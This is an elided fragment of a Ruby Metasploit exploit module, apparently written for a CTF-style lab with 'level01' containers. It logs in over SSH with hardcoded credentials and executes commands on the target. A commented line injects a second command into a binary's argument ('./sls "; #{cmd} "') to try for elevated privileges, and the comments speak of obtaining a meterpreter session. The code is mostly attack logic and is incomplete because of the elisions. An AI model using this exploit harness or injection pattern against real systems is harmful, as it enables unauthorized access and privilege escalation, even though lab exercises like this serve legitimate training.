...
class MetasploitModule < Msf::Exploit::Remote
  ...
  def initialize
    ...
    register_options(
      [
        OptString.new('USERNAME', [ true, "The user to authenticate as.", 'level01' ]),
        OptString.new('PASSWORD', [ true, "The password to authenticate with.", 'mdpLevel01' ]),
        Opt::RHOST('target'),
        Opt::RPORT(22)
      ]
    )
  ...
  def execute_command(cmd, opts = {})
    ...
    begin
      command = cmd                         #try this first, it should work and give you a meterpreter session, but without elevated previliege
      #command = "./sls \"; #{cmd} \""      #then comment the line above and uncomment this, the meterpreter fails to start... (don't forget to delete and start a new target container between tries)
      
      puts"Executing #{command}"
      Timeout.timeout(3.5) { ssh_socket.exec!(command) }
